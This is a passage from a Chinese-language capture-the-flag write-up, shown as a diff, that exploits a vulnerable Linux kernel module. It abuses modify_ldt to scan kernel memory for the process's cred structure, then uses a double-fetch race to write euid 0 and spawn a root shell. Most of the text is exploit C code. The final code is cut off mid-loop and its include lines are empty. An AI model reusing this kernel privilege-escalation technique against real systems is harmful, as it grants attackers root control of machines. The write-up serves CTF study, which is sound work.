@@ -1,0 +1,223 @@
+                    dup_mm()
+                        dup_mmap()
+                            arch_dup_mmap()
+                                ldt_dup_context()
+ldt_dup_context() 定义于 `arch/x86/kernel/ldt.c` 中，逻辑如下：
+    /*
+     * Called on fork from arch_dup_mmap(). Just copy the current LDT state,
+     * the new task is not running, so nothing can be installed.
+     */
+    int ldt_dup_context(struct mm_struct *old_mm, struct mm_struct *mm)
+    {
+        //...
+        memcpy(new_ldt->entries, old_mm->context.ldt->entries,
+               new_ldt->nr_entries * LDT_ENTRY_SIZE);
+           //...
+    }
+在这里会通过 memcpy 将父进程的 ldt->entries 拷贝给子进程， **是完全处在内核中的操作** ，因此不会触发 hardened
+usercopy 的检查，我们只需要在父进程中设定好搜索的地址之后再开子进程来用 read_ldt() 读取数据即可
+        cur_pid = getpid();
+        prctl(PR_SET_NAME, "arttnba3pwnn");
+        pipe(pipe_fd);
+        buf = (char*) mmap(NULL, 0x8000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
+        search_addr = page_offset_base;
+        cred_addr = 0;
+        while(1)
+        {
+            chunkEdit(search_addr);
+            int ret = fork();
+            if (!ret)    // child
+            {
+                signal(SIGSEGV, die);
+                syscall(SYS_modify_ldt, 0, buf, 0x8000);
+                result_addr = (size_t*) memmem(buf, 0x8000, "arttnba3pwnn", 12);
+                if (result_addr \
+                    && (result_addr[-2] > page_offset_base) \
+                    && (result_addr[-3] > page_offset_base) \
+                    && (((int) result_addr[-58]) == cur_pid))
+                {
+                    cred_addr = result_addr[-2]; // task_struct->cred
+                    printf("\033[32m\033[1m[+] Found cred: \033[0m%lx\n", cred_addr);
+                }
+                write(pipe_fd[1], &cred_addr, 8);
+                exit(0);
+            }
+            wait(NULL);
+            read(pipe_fd[0], &cred_addr, 8);
+            if (cred_addr)
+                break;
+            search_addr += 0x8000;
+        }
+> 这里需要注意一点就是 uid 的类型为 int，笔者因为这个疏忽卡了好一阵子…
+**Step III. double fetch 更改进程 uid 完成提权**
+在我们获得了 cred 的地址之后，我们只需要将 cred->euid 更改为 0 就能拥有 root 权限，之后再调用 `setreuid ()`
+等一系列函数完成全面的提权
+现在我们考虑如何在内核空间中进行任意写，这一次我们仍然借助 modify_ldt() 系统调用来达到我们的目的，重新回到 `write_ldt()`
+函数的主体逻辑：
+    static int write_ldt(void __user *ptr, unsigned long bytecount, int oldmode)
+    {
+        //...
+        old_ldt       = mm->context.ldt;
+        old_nr_entries = old_ldt ? old_ldt->nr_entries : 0;
+        new_nr_entries = max(ldt_info.entry_number + 1, old_nr_entries);
+        error = -ENOMEM;
+        new_ldt = alloc_ldt_struct(new_nr_entries);
+        if (!new_ldt)
+            goto out_unlock;
+        if (old_ldt)
+            memcpy(new_ldt->entries, old_ldt->entries, old_nr_entries * LDT_ENTRY_SIZE);
+        new_ldt->entries[ldt_info.entry_number] = ldt;
+        //...
+    }
+我们可以看到的是，在 memcpy 时所拷贝的字节数为 `old_ldt->nr_entries *
+LDT_ENTRY_SIZE`，其中前者的上限值与后者都定义于 `arch/x86/include/uapi/asm/ldt.h` 中，如下：
+    /* Maximum number of LDT entries supported. */
+    #define LDT_ENTRIES    8192
+    /* The size of each LDT entry. */
+    #define LDT_ENTRY_SIZE    8
+那么这个数据量相对较大，拷贝需要用到一定的时间，而在拷贝结束后有一句 `new_ldt->entries[ldt_info.entry_number] =
+ldt`，其中 ldt 为我们传入的数据，我们不难想到的是 **可以通过条件竞争的方式在 memcpy 过程中将 new_ldt- >entries
+更改为我们的目标地址从而完成任意地址写**，即 double fetch
+在这里为了提高利用的成功率，笔者参照官方题解中使用 `sched_setaffinity` 将相应的进程绑定到单个 CPU 上（在 run.sh
+中定义了两个核），需要注意的是编译时需包含 `#define _GNU_SOURCE`
+在这里 **有几个令笔者所不解的点** ，目前暂时还没联系上出题人（ ~~都过去一个月了谁还看discord啊~~ ）：
+  * 在开子进程任意写之前要先将当前的 `old_ldt->entries` 设为 `cred_addr + 4`，不然成功率会大幅下降
+  * 任意写时需先分配 index 为 1~ 15 的 object，并全部释放，选取其中的 `index 11` 来进行任意写，其他的 index 都会失败，仅分配一个 object 也会失败
+**FINAL EXPLOIT**
+最终的 exp 如下：
+    #define _GNU_SOURCE
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    long kernote_fd;
+    void errExit(char * msg)
+    {
+        printf("\033[31m\033[1m[x] %s \033[0m\n", msg);
+        exit(EXIT_FAILURE);
+    }
+    void chunkSet(int index)
+    {
+        ioctl(kernote_fd, 0x6666, index);
+    }
+    void chunkAdd(int index)
+    {
+        ioctl(kernote_fd, 0x6667, index);
+    }
+    void chunkDel(int index)
+    {
+        ioctl(kernote_fd, 0x6668, index);
+    }
+    void chunkEdit(size_t data)
+    {
+        ioctl(kernote_fd, 0x6669, data);
+    }
+    void chunkFuck(void)
+    {
+        ioctl(kernote_fd, 0x666A);
+    }
+    void getRootShell(void)
+    {   
+        if(getuid())
+        {
+            puts("\033[31m\033[1m[x] Failed to get the root!\033[0m");
+            exit(-1);
+        }
+        puts("\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m");
+        system("/bin/sh");
+    }
+    int main(int argc, char ** argv, char ** envp)
+    {
+        struct user_desc     desc;
+        size_t                 page_offset_base = 0xffff888000000000;
+        size_t              temp;
+        int                 retval;
+        size_t                cred_addr;
+        size_t                search_addr;
+        size_t              per_search_addr;
+        size_t              *result_addr;
+        int                   cur_pid;
+        char                *buf;
+        int                 pipe_fd[2] = {0};
+        cpu_set_t           cpu_set;
+        printf("\033[34m\033[1m[*] Start to exploit... \033[0m\n");
+        desc.base_addr = 0xff0000;
+        desc.entry_number = 0x8000 / 8;
+        desc.limit = 0;
+        desc.seg_32bit = 0;
+        desc.contents = 0;
+        desc.limit_in_pages = 0;
+        desc.lm = 0;
+        desc.read_exec_only = 0;
+        desc.seg_not_present = 0;
+        desc.useable = 0;
+        kernote_fd = open("/dev/kernote", O_RDWR);
+        chunkAdd(0);
+        chunkSet(0);
+        chunkDel(0);
+        syscall(SYS_modify_ldt, 1, &desc, sizeof(desc));
+        while(1)
+        {
+            //printf("\033[34m\033[1m[*] now checking: \033[0m%lx\n", page_offset_base);
+            chunkEdit(page_offset_base);
+            retval = syscall(SYS_modify_ldt, 0, &temp, 8);// final param should be 8 there
+            if (retval >= 0)
+                break;
+            page_offset_base += 0x4000000;
+        }
+        printf("\033[32m\033[1m[+] Found page_offset_base: \033[0m%lx\n", page_offset_base);
+        cur_pid = getpid();
+        prctl(PR_SET_NAME, "arttnba3pwnn");
+        pipe(pipe_fd);
+        buf = (char*) mmap(NULL, 0x8000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
+        search_addr = page_offset_base;
+        cred_addr = 0;
+        while(1)
+        {
+            chunkEdit(search_addr);
+            retval = fork();
+            if (!retval)    // child
+            {
+                syscall(SYS_modify_ldt, 0, buf, 0x8000);
+                result_addr = (size_t*) memmem(buf, 0x8000, "arttnba3pwnn", 12);
+                if (result_addr \
+                    && (result_addr[-2] > page_offset_base) \
+                    && (result_addr[-3] > page_offset_base) \
+                    && (((int) result_addr[-58]) == cur_pid))
+                {
+                    cred_addr = result_addr[-2]; // task_struct->cred
+                    printf("\033[32m\033[1m[+] Found cred: \033[0m%lx\n", cred_addr);
+                }
+                write(pipe_fd[1], &cred_addr, 8);
+                exit(0);
+            }
+            wait(NULL);
+            read(pipe_fd[0], &cred_addr, 8);
+            if (cred_addr)
+                break;
+            search_addr += 0x8000;
+        }
+        //chunkEdit(cred_addr + 4);
+        retval = fork();
+        if (!retval) // child
+        {
+            retval = fork();
+            if (!retval) // child's child
+            {
+                CPU_ZERO(&cpu_set);
+                CPU_SET(0, &cpu_set);
+                sched_setaffinity(0, sizeof(cpu_set), &cpu_set);
+                sleep(1);
+                for (int i = 1; i  打远程的脚本可以参照 kbrop 的
+不一定能一次成功，有的时候需要多试几次，笔者个人推测应当是 freelist 随机化的缘故
